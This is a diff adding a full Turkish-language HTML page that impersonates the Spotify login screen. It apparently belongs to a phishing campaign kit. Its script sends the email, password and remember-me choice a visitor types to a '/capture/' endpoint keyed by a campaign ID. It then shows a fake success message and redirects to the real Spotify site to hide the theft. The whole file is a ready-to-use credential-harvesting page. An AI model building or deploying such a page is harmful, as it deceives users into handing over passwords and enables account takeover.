@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify - Müzik dinleyin</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Circular', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }                                                                                                                                               
+        .header {
+            padding: 24px 32px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+
+        .logo {
+            color: #1db954;
+            font-size: 32px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-icon {
+            font-size: 40px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 32px;
+            align-items: center;
+        }
+
+        .nav-link {
+            color: #b3b3b3;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+
+        .nav-link:hover {
+            color: #fff;
+        }
+
+        .signup-btn {
+            background-color: transparent;
+            color: #b3b3b3;
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 12px 32px;
+        }
+
+        .signup-btn:hover {
+            color: #fff;
+        }
+
+        .login-btn {
+            background-color: #fff;
+            color: #000;
+            border: none;
+            padding: 12px 32px;
+            border-radius: 500px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .login-btn:hover {
+            transform: scale(1.04);
+        }
+
+        .hero {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 60px 20px;
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
+                        url('https://www.scdn.co/i/_global/twitter_card-default.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+
+        .login-modal {
+            background-color: #000;
+            border-radius: 12px;
+            padding: 48px;
+            max-width: 734px;
+            width: 100%;
+            box-shadow: 0 4px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 48px;
+        }
+
+        .modal-logo {
+            color: #1db954;
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+
+        .modal-title {
+            font-size: 48px;
+            font-weight: 900;
+            margin-bottom: 16px;
+            letter-spacing: -0.04em;
+        }
+
+        .modal-subtitle {
+            font-size: 18px;
+            color: #b3b3b3;
+            font-weight: 600;
+        }
+
+        .social-login {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-bottom: 32px;
+        }
+
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            border-radius: 500px;
+            border: 1px solid #878787;
+            background: none;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+
+        .social-btn:hover {
+            border-color: #fff;
+        }
+
+        .social-btn i {
+            margin-right: 12px;
+            font-size: 24px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 32px 0;
+            color: #b3b3b3;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #878787;
+        }
+
+        .divider span {
+            padding: 0 24px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .form-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .form-input {
+            padding: 16px;
+            background-color: #121212;
+            border: 1px solid #878787;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #fff;
+        }
+
+        .form-input.error {
+            border-color: #e91429;
+        }
+
+        .error-message {
+            color: #e91429;
+            font-size: 14px;
+            display: none;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .remember-me input {
+            width: 20px;
+            height: 20px;
+        }
+
+        .remember-me label {
+            font-size: 14px;
+            color: #b3b3b3;
+        }
+
+        .login-submit {
+            background-color: #1db954;
+            color: #000;
+            border: none;
+            padding: 16px;
+            border-radius: 500px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin: 16px 0;
+            transition: background-color 0.2s;
+        }
+
+        .login-submit:hover {
+            background-color: #1ed760;
+        }
+
+        .forgot-password {
+            color: #b3b3b3;
+            text-decoration: none;
+            font-size: 16px;
+            text-align: center;
+            display: block;
+            margin: 16px 0;
+        }
+
+        .forgot-password:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+
+        .signup-prompt {
+            text-align: center;
+            margin-top: 32px;
+            padding-top: 32px;
+            border-top: 1px solid #878787;
+            color: #b3b3b3;
+            font-size: 18px;
+        }
+
+        .signup-prompt a {
+            color: #fff;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        .signup-prompt a:hover {
+            color: #1db954;
+        }
+
+        .loading {
+            display: none;
+            margin: 10px auto;
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid #1db954;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            padding: 32px;
+            text-align: center;
+            color: #b3b3b3;
+            font-size: 12px;
+            border-top: 1px solid #878787;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 24px;
+            margin-bottom: 16px;
+        }
+
+        .footer-links a {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <span class="logo-icon">♫</span>
+            Spotify
+        </div>
+
+        <div class="nav-links">
+            <a href="#" class="nav-link">Premium</a>
+            <a href="#" class="nav-link">Destek</a>
+            <a href="#" class="nav-link">İndir</a>
+            <span>|</span>
+            <button class="signup-btn">Kaydol</button>
+            <button class="login-btn" onclick="showLoginModal()">Oturum aç</button>
+        </div>
+    </div>
+
+    <div class="hero">
+        <div class="login-modal" id="login-modal">
+            <div class="modal-header">
+                <div class="modal-logo">♫</div>
+                <h1 class="modal-title">Spotify'da oturum aç</h1>
+                <p class="modal-subtitle">Sınırsız müziğe ve podcast'lere devam edin.</p>
+            </div>
+
+            <div class="social-login">
+                <button class="social-btn">
+                    <i class="fab fa-google"></i> Google ile devam et
+                </button>
+                <button class="social-btn">
+                    <i class="fab fa-facebook"></i> Facebook ile devam et
+                </button>
+                <button class="social-btn">
+                    <i class="fab fa-apple"></i> Apple ile devam et
+                </button>
+            </div>
+
+            <div class="divider">
+                <span>veya</span>
+            </div>
+
+            <form class="login-form" id="login-form">
+                <div class="form-group">
+                    <label for="email" class="form-label">E-posta adresi veya kullanıcı adı</label>
+                    <input type="text" id="email" class="form-input" placeholder="E-posta adresi veya kullanıcı adı" required>
+                    <div class="error-message" id="email-error">Lütfen geçerli bir e-posta adresi veya kullanıcı adı girin.</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password" class="form-label">Parola</label>
+                    <input type="password" id="password" class="form-input" placeholder="Parola" required>
+                    <div class="error-message" id="password-error">Lütfen parolanızı girin.</div>
+                </div>
+
+                <div class="remember-me">
+                    <input type="checkbox" id="remember" checked>
+                    <label for="remember">Beni hatırla</label>
+                </div>
+
+                <button type="submit" class="login-submit">Oturum aç</button>
+                <div class="loading" id="loading"></div>
+
+                <a href="#" class="forgot-password">Parolanızı mı unuttunuz?</a>
+            </form>
+
+            <div class="signup-prompt">
+                Hesabınız yok mu? <a href="#" onclick="showSignup()">Spotify'da kaydolun</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Yasal</a>
+            <a href="#">Gizlilik Merkezi</a>
+            <a href="#">Gizlilik Politikası</a>
+            <a href="#">Tanımlama Bilgileri</a>
+            <a href="#">Reklamlar Hakkında</a>
+            <a href="#">Erişilebilirlik</a>
+        </div>
+        <div>© 2023 Spotify AB</div>
+    </div>
+
+    <script>
+        const campaignId = window.location.pathname.substring(1);
+
+        // Show login modal on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            showLoginModal();
+        });
+
+        function showLoginModal() {
+            // Already shown by default
+        }
+
+        function showSignup() {
+            alert('Kayıt olma özelliği şu anda kullanılamıyor.');
+        }
+
+        // Login form submission
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+
+            if (!email) {
+                document.getElementById('email-error').style.display = 'block';
+                document.getElementById('email').classList.add('error');
+                return;
+            }
+
+            if (!password) {
+                document.getElementById('password-error').style.display = 'block';
+                document.getElementById('password').classList.add('error');
+                return;
+            }
+
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                const response = await fetch(`/capture/${campaignId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        remember_me: remember,
+                        timestamp: new Date().toISOString(),
+                        platform: 'Spotify'
+                    })
+                });
+
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    alert('Oturum açma başarılı! Spotify\'a yönlendiriliyorsunuz...');
+
+                    setTimeout(() => {
+                        window.location.href = 'https://open.spotify.com/';
+                    }, 1000);
+                }, 2000);
+
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+            }
+        });
+
+        // Social login buttons
+        document.querySelectorAll('.social-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                alert('Sosyal medya ile giriş özelliği şu anda kullanılamıyor.');
+            });
+        });
+
+        // Clear errors on input
+        document.getElementById('email').addEventListener('input', function() {
+            this.classList.remove('error');
+            document.getElementById('email-error').style.display = 'none';
+        });
+
+        document.getElementById('password').addEventListener('input', function() {
+            this.classList.remove('error');
+            document.getElementById('password-error').style.display = 'none';
+        });
+
+        // Header login button
+        document.querySelector('.header .login-btn').addEventListener('click', function() {
+            document.getElementById('login-modal').scrollIntoView({ behavior: 'smooth' });
+        });
+    </script>
+</body>
+</html>
